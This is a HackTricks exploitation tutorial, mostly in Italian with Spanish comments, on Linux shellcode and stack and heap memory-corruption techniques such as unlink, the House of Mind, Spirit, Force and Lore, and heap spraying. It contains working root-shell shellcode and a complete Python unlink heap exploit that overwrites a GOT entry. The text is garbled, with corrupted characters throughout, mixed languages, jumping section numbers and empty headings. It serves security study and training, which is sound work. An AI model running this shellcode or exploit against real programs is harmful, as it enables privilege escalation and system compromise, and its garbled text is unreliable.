# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; puliamo eax\
xor ebx, ebx ; ebx = 0 poich√© non ci sono argomenti da passare\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Esegui syscall

**nasm -f elf assembly.asm** ‚Äî> Restituisce un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Fornisce un eseguibile formato dal codice assembly e possiamo estrarre gli opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Per vedere che effettivamente √® la nostra shellcode e estrarre gli OpCodes

**Controllare che la shellcode funzioni**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Per vedere che le chiamate di sistema vengono eseguite correttamente, √® necessario compilare il programma precedente e le chiamate di sistema devono apparire in **strace ./PROGRAMA\_COMPILATO**

Quando si creano shellcode, si pu√≤ fare un trucco. La prima istruzione √® un jump a un call. Il call chiama il codice originale e inoltre inserisce nello stack l'EIP. Dopo l'istruzione call abbiamo inserito la stringa di cui avevamo bisogno, quindi con quell'EIP possiamo puntare alla stringa e continuare a eseguire il codice.

EJ **TRUCCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando el Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

Consiste in un piccolo codice che percorre le pagine di memoria associate a un processo in cerca della shellcode l√¨ memorizzata (cerca qualche firma presente nella shellcode). Utile nei casi in cui si ha solo un piccolo spazio per iniettare codice.

**Shellcodes polimorfici**

Consistono in shell cifrate che hanno un piccolo codice che le decifra e salta a esse, usando il trucco di Call-Pop questo sarebbe un **esempio cifrato cesar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.Metodi complementari**

**Tecnica di Murat**

In linux tutti i programmi si mappano iniziando da 0xbfffffff

Vedendo come si costruisce lo stack di un nuovo processo in linux si pu√≤ sviluppare un exploit in modo che il programma venga avviato in un ambiente la cui unica variabile sia la shellcode. L'indirizzo di questa pu√≤ quindi essere calcolato come: addr = 0xbfffffff - 4 - strlen(NOME\_eseguibile\_completo) - strlen(shellcode)

In questo modo si otterrebbe in modo semplice l'indirizzo dove si trova la variabile di ambiente con la shellcode.

Questo √® possibile grazie al fatto che la funzione execle permette di creare un ambiente che contenga solo le variabili di ambiente desiderate.

###

###

###

###

###

### **Format Strings to Buffer Overflows**

La **sprintf moves** una stringa formattata **a** una **variabile.** Pertanto, si potrebbe abusare del **formato** di una stringa per causare un **buffer overflow nella variabile** dove il contenuto viene copiato.\
Ad esempio, il payload `%.44xAAAA` scriver√† **44B+"AAAA" nella variabile**, il che potrebbe causare un buffer overflow.

### **\_\_atexit Structures**

{% hint style="danger" %}
Oggigiorno √® molto **strano sfruttare questo**.
{% endhint %}

**`atexit()`** √® una funzione a cui **altre funzioni vengono passate come parametri.** Queste **funzioni** verranno **eseguite** quando si esegue un **`exit()`** o il **ritorno** del **main**.\
Se puoi **modificare** l'**indirizzo** di una di queste **funzioni** per puntare a una shellcode, ad esempio, otterrai **il controllo** del **processo**, ma attualmente questo √® pi√π complicato.\
Attualmente gli **indirizzi delle funzioni** da eseguire sono **nascosti** dietro diverse strutture e infine l'indirizzo a cui puntano non √® l'indirizzo delle funzioni, ma √® **crittografato con XOR** e spostamenti con una **chiave casuale**. Quindi attualmente questo vettore di attacco non √® **molto utile almeno su x86** e **x64\_86**.\
La **funzione di crittografia** √® **`PTR_MANGLE`**. **Altre architetture** come m68k, mips32, mips64, aarch64, arm, hppa... **non implementano la funzione di crittografia** perch√© **restituisce lo stesso** di quanto ricevuto come input. Quindi queste architetture sarebbero attaccabili tramite questo vettore.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Oggigiorno √® molto **strano sfruttare questo**.
{% endhint %}

**`Setjmp()`** consente di **salvare** il **contesto** (i registri)\
**`longjmp()`** consente di **ripristinare** il **contesto**.\
I **registri salvati** sono: `EBX, ESI, EDI, ESP, EIP, EBP`\
Quello che succede √® che EIP ed ESP vengono passati dalla funzione **`PTR_MANGLE`**, quindi le **architetture vulnerabili a questo attacco sono le stesse di sopra**.\
Sono utili per il recupero degli errori o per le interruzioni.\
Tuttavia, da quello che ho letto, gli altri registri non sono protetti, **quindi se c'√® un `call ebx`, `call esi` o `call edi`** all'interno della funzione chiamata, il controllo pu√≤ essere preso. Oppure si potrebbe anche modificare EBP per modificare ESP.

**VTable e VPTR in C++**

Ogni classe ha una **Vtable** che √® un array di **puntatori a metodi**.

Ogni oggetto di una **classe** ha un **VPtr** che √® un **puntatore** all'array della sua classe. Il VPtr √® parte dell'intestazione di ogni oggetto, quindi se si ottiene un **overwrite** del **VPtr** si potrebbe **modificare** per **puntare** a un metodo fittizio in modo che l'esecuzione di una funzione vada alla shellcode.

## **Misure preventive e evasioni**

###

**Sostituzione di Libsafe**

Si attiva con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Si intercettano le chiamate ad alcune funzioni non sicure con altre sicure. Non √® standardizzato. (solo per x86, non per compilazioni con -fomit-frame-pointer, non compilazioni statiche, non tutte le funzioni vulnerabili diventano sicure e LD\_PRELOAD non funziona in binari con suid).

**ASCII Armored Address Space**

Consiste nel caricare le librerie condivise da 0x00000000 a 0x00ffffff affinch√© ci sia sempre un byte 0x00. Tuttavia, questo in realt√† non ferma quasi nessun attacco, e meno in little endian.

**ret2plt**

Consiste nel realizzare un ROP in modo che venga chiamata la funzione strcpy@plt (dalla plt) e si punti all'entrata della GOT e si copi il primo byte della funzione che si desidera chiamare (system()). Subito dopo si fa lo stesso puntando a GOT+1 e si copia il 2¬∞ byte di system()‚Ä¶ Alla fine si chiama l'indirizzo salvato in GOT che sar√† system().

**Gabbie con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installa un sistema di base sotto un sottodirectory specifico

Un admin pu√≤ uscire da una di queste gabbie facendo: mkdir foo; chroot foo; cd ..

**Strumentazione del codice**

Valgrind ‚Äî> Cerca errori\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits di base**

**Blocco assegnato**

prev\_size |\
size | ‚ÄîIntestazione\
\*mem | Dati

**Blocco libero**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîIntestazione\
\*mem | Dati

I blocchi liberi sono in una lista doppiamente collegata (bin) e non possono mai esserci due blocchi liberi insieme (si uniscono)

In ‚Äúsize‚Äù ci sono bit per indicare: Se il blocco precedente √® in uso, se il blocco √® stato assegnato tramite mmap() e se il blocco appartiene all'arena primaria.

Se liberando un blocco uno dei contigui si trova libero, questi si fondono tramite la macro unlink() e si passa il nuovo blocco pi√π grande a frontlink() affinch√© inserisca il bin adeguato.

unlink(){\
BK = P->bk; ‚Äî> Il BK del nuovo chunk √® quello che aveva il chunk gi√† libero prima\
FD = P->fd; ‚Äî> Il FD del nuovo chunk √® quello che aveva il chunk gi√† libero prima\
FD->bk = BK; ‚Äî> Il BK del chunk successivo punta al nuovo chunk\
BK->fd = FD; ‚Äî> Il FD del chunk precedente punta al nuovo chunk\
}

Pertanto, se riusciamo a modificare il P->bk con l'indirizzo di una shellcode e il P->fd con l'indirizzo a un'entrata nella GOT o DTORS meno 12 si ottiene:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E cos√¨ si esegue al termine del programma la shellcode.

Inoltre, la 4¬™ istruzione di unlink() scrive qualcosa e la shellcode deve essere riparata per questo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Questo provoca la scrittura di 4 byte a partire dall'8¬∞ byte della shellcode, quindi la prima istruzione della shellcode deve essere un jmp per saltare questo e cadere in alcuni nops che portano al resto della shellcode.

Pertanto, l'exploit si crea:

Nel buffer1 mettiamo la shellcode iniziando con un jmp affinch√© cada nei nops o nel resto della shellcode.

Dopo la shellcode mettiamo riempimento fino a raggiungere il campo prev\_size e size del blocco successivo. In questi posti mettiamo 0xfffffff0 (in modo che si sovrascriva il prev\_size affinch√© abbia il bit che dice che √® libero) e ‚Äú-4‚Äú(0xfffffffc) nello size (perch√© quando controlla nel 3¬∞ blocco se il 2¬∞ era realmente libero vada al prev\_size modificato che gli dir√† che √® libero) -> Cos√¨ quando free() indaga andr√† allo size del 3¬∞ ma in realt√† andr√† al 2¬∞ - 4 e penser√† che il 2¬∞ blocco sia libero. E quindi chiamer√† **unlink()**.

Chiamando unlink() user√† come P->fd i primi dati del 2¬∞ blocco per cui l√¨ si metter√† l'indirizzo che si vuole sovrascrivere - 12 (poich√© in FD->bk gli somma 12 all'indirizzo salvato in FD). E in quell'indirizzo inserir√† il secondo indirizzo che trova nel 2¬∞ blocco, che ci interesser√† che sia l'indirizzo alla shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes di riempimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interessa che il bit che indica che il blocco precedente √® libero sia a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, affinch√© pensi che lo ‚Äúsize‚Äù del 3¬∞ blocco sia 4bytes dietro (punta a prev\_size) poich√© √® l√¨ che guarda se il 2¬∞ blocco √® libero**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Nel payload all'inizio metteremo 8bytes di riempimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Indirizzo di free() nella plt-12 (sar√† l'indirizzo che si sovrascriver√† affinch√© si lanci la shellcode la 2¬™ volta che si chiama free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Come si √® detto il payload inizia con 8 byte di riempimento perch√© s√¨**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Si modifica il 2¬∞ blocco, il got\_free punta a dove andremo a salvare l'indirizzo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando in senso inverso (wargame)**

Stiamo controllando 3 blocchi consecutivi e vengono liberati in ordine inverso rispetto a quello riservato.

In quel caso:

Nel blocco c si mette la shellcode

Il blocco a lo usiamo per sovrascrivere il b in modo che lo size abbia il bit PREV\_INUSE disattivato affinch√© pensi che il blocco a sia libero.

Inoltre, si sovrascrive nell'intestazione b lo size affinch√© valga -4.

Quindi, il programma penser√† che ‚Äúa‚Äù sia libero e in un bin, per cui chiamer√† unlink() per disconnetterlo. Tuttavia, poich√© l'intestazione PREV\_SIZE vale -4. Penser√† che il blocco di ‚Äúa‚Äù inizi realmente in b+4. Cio√®, far√† un unlink() a un blocco che inizia in b+4, per cui in b+12 ci sar√† il puntatore ‚Äúfd‚Äù e in b+16 ci sar√† il puntatore ‚Äúbk‚Äù.

In questo modo, se in bk mettiamo l'indirizzo alla shellcode e in fd mettiamo l'indirizzo alla funzione ‚Äúputs()‚Äù-12 abbiamo il nostro payload.

**Tecnica di Frontlink**

Si chiama frontlink quando si libera qualcosa e nessuno dei suoi blocchi contigui √® libero, non si chiama unlink() ma si chiama direttamente frontlink().

Vulnerabilit√† utile quando il malloc che si attacca non viene mai liberato (free()).

Necessita di:

Un buffer che possa essere sovrascritto con la funzione di input

Un buffer contiguo a questo che deve essere liberato e al quale si modificher√† il campo fd della sua intestazione grazie al sovraccarico del buffer precedente

Un buffer da liberare con una dimensione maggiore di 512 ma minore del buffer precedente

Un buffer dichiarato prima del passo 3 che consenta di sovrascrivere il prev\_size di questo

In questo modo, riuscendo a sovrascrivere in due malloc in modo incontrollato e in uno in modo controllato ma che viene liberato solo quello, possiamo fare un exploit.

**Vulnerabilit√† double free()**

Se si chiama due volte free() con lo stesso puntatore, rimangono due bin che puntano alla stessa indirizzo.

Nel caso si voglia riutilizzare uno, verrebbe assegnato senza problemi. Nel caso si voglia usare un altro, gli verrebbe assegnato lo stesso spazio per cui avremmo i puntatori ‚Äúfd‚Äù e ‚Äúbk‚Äù falsati con i dati che scriver√† la riserva precedente.

**After free()**

Un puntatore precedentemente liberato viene utilizzato di nuovo senza controllo.

## **8 Heap Overflows: Exploits avanzati**

Le tecniche di Unlink() e FrontLink() sono state eliminate modificando la funzione unlink().

**The house of mind**

Basta una sola chiamata a free() per provocare l'esecuzione di codice arbitrario. √à interessante cercare un secondo blocco che pu√≤ essere sovrascritto da uno precedente e liberato.

Una chiamata a free() provoca la chiamata a public\_fREe(mem), questo fa:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Restituisce un puntatore all'indirizzo dove inizia il blocco (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] controlla il campo size il bit NON\_MAIN\_ARENA, il quale pu√≤ essere alterato affinch√© il controllo restituisca true ed esegua heap\_for\_ptr() che fa un and a ‚Äúmem‚Äù lasciando a 0 i 2.5 byte meno significativi (nel nostro caso da 0x0804a000 lascia 0x08000000) e accede a 0x08000000->ar\_ptr (come se fosse un struct heap\_info)

In questo modo, se possiamo controllare un blocco ad esempio in 0x0804a000 e si va a liberare un blocco in **0x081002a0** possiamo arrivare all'indirizzo 0x08100000 e scrivere quello che vogliamo, ad esempio **0x0804a000**. Quando questo secondo blocco viene liberato si scoprir√† che heap\_for\_ptr(ptr)->ar\_ptr restituisce ci√≤ che abbiamo scritto in 0x08100000 (poich√© si applica a 0x081002a0 l'and che abbiamo visto prima e da l√¨ si estrae il valore dei primi 4 byte, l'ar\_ptr)

In questo modo si chiama a \_int\_free(ar\_ptr, mem), cio√®, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Come abbiamo visto prima possiamo controllare il valore di av, poich√© √® ci√≤ che scriviamo nel blocco che si va a liberare.

Cos√¨ come √® definito unsorted\_chunks, sappiamo che:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Pertanto, se in av->bins\[2] scriviamo il valore di \_\_DTOR\_END\_\_-12 nell'ultima istruzione si scriver√† in \_\_DTOR\_END\_\_ l'indirizzo del secondo blocco.

Cio√®, nel primo blocco dobbiamo mettere all'inizio molte volte l'indirizzo di \_\_DTOR\_END\_\_-12 perch√© da l√¨ lo prender√† av->bins\[2]

Nell'indirizzo in cui cadr√† l'indirizzo del secondo blocco con gli ultimi 5 zeri dobbiamo scrivere l'indirizzo a questo primo blocco affinch√© heap\_for\_ptr() pensi che l'ar\_ptr sia all'inizio del primo blocco e prenda da l√¨ l'av->bins\[2]

Nel secondo blocco e grazie al primo sovrascriviamo il prev\_size con un jump 0x0c e lo size con qualcosa per attivare -> NON\_MAIN\_ARENA

A questo punto nel blocco 2 mettiamo un sacco di nops e infine la shellcode

In questo modo si chiamer√† a \_int\_free(TROZO1, TROZO2) e seguir√† le istruzioni per scrivere in \_\_DTOR\_END\_\_ l'indirizzo del prev\_size del TROZO2 il quale salter√† alla shellcode.

Per applicare questa tecnica √® necessario che si soddisfino alcuni requisiti in pi√π che complicano un po' di pi√π il payload.

Questa tecnica non √® pi√π applicabile poich√© √® stato applicato quasi lo stesso patch che per unlink. Si confrontano se il nuovo sito a cui si punta sta anche puntando a lui.

**Fastbin**

√à una variante di The house of mind

ci interessa arrivare a eseguire il seguente codice al quale si arriva passata la prima verifica della funzione \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Essendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

In questo modo, se si mette in ‚Äúfb‚Äù d√† l'indirizzo di una funzione nella GOT, in questo indirizzo si metter√† l'indirizzo al blocco sovrascritto. Per questo sar√† necessario che l'arena sia vicina agli indirizzi di dtors. Pi√π precisamente che av->max\_fast sia nell'indirizzo che andremo a sovrascrivere.

Poich√© con The House of Mind si √® visto che noi controllavamo la posizione dell'av.

Quindi, se nel campo size mettiamo una dimensione di 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ci restituir√† fastbins\[-1], che punter√† a av->max\_fast

In questo caso av->max\_fast sar√† l'indirizzo che si sovrascriver√† (non a cui punta, ma quella posizione sar√† quella che si sovrascriver√†).

Inoltre, deve essere soddisfatto che il blocco contiguo al liberato deve essere maggiore di 8 -> Dato che abbiamo detto che lo size del blocco liberato √® 8, in questo blocco falso dobbiamo solo mettere uno size maggiore di 8 (come inoltre la shellcode andr√† nel blocco liberato, dovremo mettere all'inizio un jmp che cada nei nops).

Inoltre, quel stesso blocco falso deve essere minore di av->system\_mem. av->system\_mem si trova 1848 byte pi√π in l√†.

A causa dei nulli di \_DTOR\_END\_ e delle poche indirizzi nella GOT, nessun indirizzo di queste sezioni serve per essere sovrascritto, quindi vediamo come applicare fastbin per attaccare lo stack.

Un altro modo di attacco √® reindirizzare l'**av** verso lo stack.

Se modifichiamo lo size affinch√© dia 16 invece di 8 allora: fastbin\_index() ci restituir√† fastbins\[0] e possiamo utilizzare questo per sovrascrivere lo stack.

Per questo non deve esserci alcun canary n√© valori strani nello stack, infatti dobbiamo trovarci in questo: 4byte nulli + EBP + RET

I 4 byte nulli sono necessari affinch√© l'**av** sia a questo indirizzo e il primo elemento di un **av** √® il mutex che deve valere 0.

L'**av->max\_fast** sar√† l'EBP e sar√† un valore che ci servir√† per saltare le restrizioni.

Nell'**av->fastbins\[0]** si sovrascriver√† con l'indirizzo di **p** e sar√† il RET, cos√¨ si salter√† alla shellcode.

Inoltre, in **av->system\_mem** (1484byte sopra la posizione nello stack) ci sar√† abbastanza spazzatura che ci permetter√† di saltare il controllo che si esegue.

Inoltre, deve essere soddisfatto che il blocco contiguo al liberato deve essere maggiore di 8 -> Dato che abbiamo detto che lo size del blocco liberato √® 16, in questo blocco falso dobbiamo solo mettere uno size maggiore di 8 (come inoltre la shellcode andr√† nel blocco liberato, dovremo mettere all'inizio un jmp che cada nei nops che vanno dopo il campo size del nuovo blocco falso).

**The House of Spirit**

In questo caso cerchiamo di avere un puntatore a un malloc che possa essere alterato dall'attaccante (ad esempio, che il puntatore sia nello stack sotto un possibile overflow a una variabile).

In questo modo, potremmo fare in modo che questo puntatore punti dove vogliamo. Tuttavia, non qualsiasi sito √® valido, la dimensione del blocco falsato deve essere minore di av->max\_fast e pi√π specificamente uguale alla dimensione richiesta in una futura chiamata a malloc()+8. Perci√≤, se sappiamo che dopo questo puntatore vulnerabile si chiama a malloc(40), la dimensione del blocco falso deve essere uguale a 48.

Se ad esempio il programma chiedesse all'utente un numero potremmo inserire 48 e puntare il puntatore di malloc modificabile ai successivi 4byte (che potrebbero appartenere all'EBP con fortuna, cos√¨ il 48 rimane dietro, come se fosse l'intestazione size). Inoltre, l'indirizzo ptr-4+48 deve soddisfare diverse condizioni (essendo in questo caso ptr=EBP), cio√®, 8 < ptr-4+48 < av->system\_mem.

Se questo viene soddisfatto, quando si chiama il successivo malloc che abbiamo detto essere malloc(40) gli verr√† assegnato come indirizzo l'indirizzo dell'EBP. Nel caso in cui l'attaccante possa anche controllare ci√≤ che viene scritto in questo malloc pu√≤ sovrascrivere sia l'EBP che l'EIP con l'indirizzo che desidera.

Questo credo che sia perch√© cos√¨ quando lo liberer√† free() registrer√† che all'indirizzo a cui punta l'EBP dello stack c'√® un blocco di dimensione perfetta per il nuovo malloc() che si vuole riservare, quindi gli assegna quell'indirizzo.

**The House of Force**

√à necessario:

* Un overflow a un blocco che consenta di sovrascrivere il wilderness
* Una chiamata a malloc() con la dimensione definita dall'utente
* Una chiamata a malloc() i cui dati possano essere definiti dall'utente

La prima cosa che si fa √® sovrascrivere lo size del blocco wilderness con un valore molto grande (0xffffffff), cos√¨ qualsiasi richiesta di memoria sufficientemente grande sar√† trattata in \_int\_malloc() senza necessit√† di espandere l'heap.

La seconda √® alterare l'av->top affinch√© punti a una zona di memoria sotto il controllo dell'attaccante, come lo stack. In av->top si metter√† \&EIP - 8.

Dobbiamo sovrascrivere av->top affinch√© punti alla zona di memoria sotto il controllo dell'attaccante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim raccoglie il valore dell'indirizzo del blocco wilderness attuale (l'attuale av->top) e remainder √® esattamente la somma di quell'indirizzo pi√π la quantit√† di byte richiesti da malloc(). Quindi se \&EIP-8 √® in 0xbffff224 e av->top contiene 0x080c2788, allora la quantit√† che dobbiamo riservare nel malloc controllato affinch√© av->top punti a $EIP-8 per il prossimo malloc() sar√†:

0xbffff224 - 0x080c2788 = 3086207644.

Cos√¨ si salver√† in av->top il valore alterato e il prossimo malloc punter√† all'EIP e potr√† sovrascriverlo.

√à importante sapere che lo size del nuovo blocco wilderness sia pi√π grande della richiesta effettuata dall'ultimo malloc(). Cio√®, se il wilderness sta puntando a \&EIP-8, lo size rimarr√† proprio nel campo EBP dello stack.

**The House of Lore**

**Corruzione SmallBin**

I blocchi liberati vengono inseriti nel bin in base alla loro dimensione. Ma prima di essere inseriti vengono conservati in unsorted bins. Un blocco viene liberato non viene immediatamente messo nel suo bin ma rimane in unsorted bins. Successivamente, se si riserva un nuovo blocco e il precedente liberato pu√≤ servirgli, lo restituisce, ma se si riserva pi√π grande, il blocco liberato in unsorted bins viene messo nel suo bin adeguato.

Per raggiungere il codice vulnerabile la richiesta di memoria dovr√† essere maggiore di av->max\_fast (72 normalmente) e minore di MIN\_LARGE\_SIZE (512).

Se nel bin c'√® un blocco della dimensione adeguata a ci√≤ che si richiede, si restituisce quello dopo averlo disconnesso:

bck = victim->bk; Punta al blocco precedente, √® l'unica info che possiamo alterare.

bin->bk = bck; Il penultimo blocco diventa l'ultimo, nel caso in cui bck punti allo stack al successivo blocco riservato verr√† data questa indirizzo.

bck->fd = bin; Si chiude la lista facendo s√¨ che questo punti a bin.

√à necessario:

Che si riservino due malloc, in modo che al primo si possa fare overflow dopo che il secondo sia stato liberato e inserito nel suo bin (cio√®, si sia riservato un malloc superiore al secondo blocco prima di fare l'overflow).

Che il malloc riservato al quale si d√† l'indirizzo scelto dall'attaccante sia controllato dall'attaccante.

L'obiettivo √® il seguente, se possiamo fare un overflow a un heap che ha sotto un blocco gi√† liberato e nel suo bin, possiamo alterare il suo puntatore bk. Se alteriamo il suo puntatore bk e questo blocco arriva a essere il primo della lista di bin e si riserva, a bin si inganner√† e si dir√† che l'ultimo blocco della lista (il successivo da offrire) √® nell'indirizzo falso che abbiamo messo (allo stack o GOT per esempio). Quindi se si riserva un altro blocco e l'attaccante ha permessi su di esso, verr√† dato un blocco nella posizione desiderata e potr√† scriverci sopra.

Dopo aver liberato il blocco modificato √® necessario che si riservi un blocco maggiore di quello liberato, cos√¨ il blocco modificato uscir√† da unsorted bins e si inserirebbe nel suo bin.

Una volta nel suo bin √® il momento di modificare il suo puntatore bk tramite l'overflow affinch√© punti all'indirizzo che vogliamo sovrascrivere.

Cos√¨ il bin dovr√† aspettare turno affinch√© si chiami malloc() sufficienti volte affinch√© si riutilizzi il bin modificato e inganni bin facendogli credere che il successivo blocco sia nell'indirizzo falso. E successivamente verr√† dato il blocco che ci interessa.

Per far s√¨ che la vulnerabilit√† venga eseguita il prima possibile, l'ideale sarebbe: Riserva del blocco vulnerabile, riserva del blocco che verr√† modificato, si libera questo blocco, si riserva un blocco pi√π grande a quello che verr√† modificato, si modifica il blocco (vulnerabilit√†), si riserva un blocco di uguale dimensione a quello vulnerato e si riserva un secondo blocco di uguale dimensione e questo sar√† quello che punta all'indirizzo scelto.

Per proteggere questo attacco si usa la tipica verifica che il blocco ‚Äúnon‚Äù √® falso: si controlla se bck->fd sta puntando a victim. Cio√®, nel nostro caso se il puntatore fd\* del blocco falso puntato nello stack sta puntando a victim. Per superare questa protezione l'attaccante dovrebbe essere in grado di scrivere in qualche modo (probabilmente dallo stack) nell'indirizzo adeguato l'indirizzo di victim. Affinch√© cos√¨ sembri un blocco vero.

**Corruzione LargeBin**

Si necessitano gli stessi requisiti di prima e qualcun altro, inoltre i blocchi riservati devono essere maggiori di 512.

L'attacco √® come il precedente, cio√®, bisogna modificare il puntatore bk e sono necessarie tutte quelle chiamate a malloc(), ma inoltre bisogna modificare lo size del blocco modificato in modo che quello size - nb sia < MINSIZE.

Ad esempio, si far√† in modo che mettere in size 1552 affinch√© 1552 - 1544 = 8 < MINSIZE (la sottrazione non pu√≤ risultare negativa perch√© si confronta un unsigned).

Inoltre √® stato introdotto un patch per renderlo ancora pi√π complicato.

**Heap Spraying**

Fondamentalmente consiste nel riservare tutta la memoria possibile per gli heap e riempirli con un materasso di nops terminati da una shellcode. Inoltre, come materasso si utilizza 0x0c. Poich√© si cercher√† di saltare all'indirizzo 0x0c0c0c0c, e cos√¨ se si sovrascrive qualche indirizzo a cui si andr√† a chiamare con questo materasso si salter√† l√¨. Fondamentalmente la tattica √® riservare il massimo possibile per vedere se si sovrascrive qualche puntatore e saltare a 0x0c0c0c0c aspettandosi che l√¨ ci siano nops.

**Heap Feng Shui**

Consiste nel seminare la memoria tramite riserve e liberazioni in modo che rimangano blocchi riservati in mezzo a blocchi liberi. Il buffer da sovrascrivere si situer√† in uno dei blocchi.

